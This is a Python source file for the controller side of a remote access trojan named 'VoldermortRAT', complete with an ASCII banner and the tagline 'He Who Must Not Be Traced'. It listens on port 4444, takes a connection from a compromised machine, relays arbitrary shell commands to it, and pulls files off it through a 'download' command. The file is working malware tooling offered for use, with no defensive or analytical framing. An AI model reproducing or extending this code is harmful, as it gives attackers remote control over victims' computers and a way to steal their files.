import socket
import os

LHOST = "0.0.0.0"
LPORT = 4444
BUFFER_SIZE = 4096

def start():
    print("""  ██▒   █▓ ▒█████   ██▓    ▓█████▄ ▓█████  ███▄ ▄███▓ ▒█████   ██▀███  
▓██░   █▒▒██▒  ██▒▓██▒    ▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▒██▒  ██▒▓██ ▒ ██▒
  ▓██  █▒░▒██░  ██▒▒██░    ░██   █▌▒███   ▓██    ▓██░▒██░  ██▒▓██ ░▄█ ▒
   ▒██ █░░▒██   ██░▒██░    ░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ▒██   ██░▒██▀▀█▄  
    ▒▀█░  ░ ████▓▒░░██████▒░▒████▓ ░▒████▒▒██▒   ░██▒░ ████▓▒░░██▓ ▒██▒
    ░ ▐░  ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ░ ░░    ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒  ░ ░  ░░  ░      ░  ░ ▒ ▒░   ░▒ ░ ▒░
      ░░  ░ ░ ░ ▒    ░ ░    ░ ░  ░    ░   ░      ░   ░ ░ ░ ▒    ░░   ░ 
       ░      ░ ░      ░  ░   ░       ░  ░       ░       ░ ░     ░     
       ░                    ░                                        
             VoldermortRAT v1.0 — "He Who Must Not Be Traced."

    """)

    s = socket.socket()
    s.bind((LHOST, LPORT))
    s.listen(1)
    print(f"[+] Listening on port {LPORT}...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}")

    while True:
        try:
            cmd = input("🧿 Azkaban > ").strip()

            if not cmd:
                continue
            if cmd == "exit":
                conn.send(b"exit\n")
                print("[!] Closing connection.")
                break

            elif cmd.startswith("download "):
                filename = cmd.split(" ", 1)[1]
                conn.send((cmd + "\n").encode())
                with open(filename, "wb") as f:
                    data = conn.recv(BUFFER_SIZE)
                    while data:
                        f.write(data)
                        data = conn.recv(BUFFER_SIZE)
                        if len(data) < BUFFER_SIZE:
                            break
                print(f"[+] File downloaded: {filename}")

            else:
                conn.send((cmd + "\n").encode())
                response = conn.recv(BUFFER_SIZE).decode()
                print(response, end="")

        except Exception as e:
            print(f"[!] Error: {e}")
            break

    conn.close()

if __name__ == "__main__":
    start()
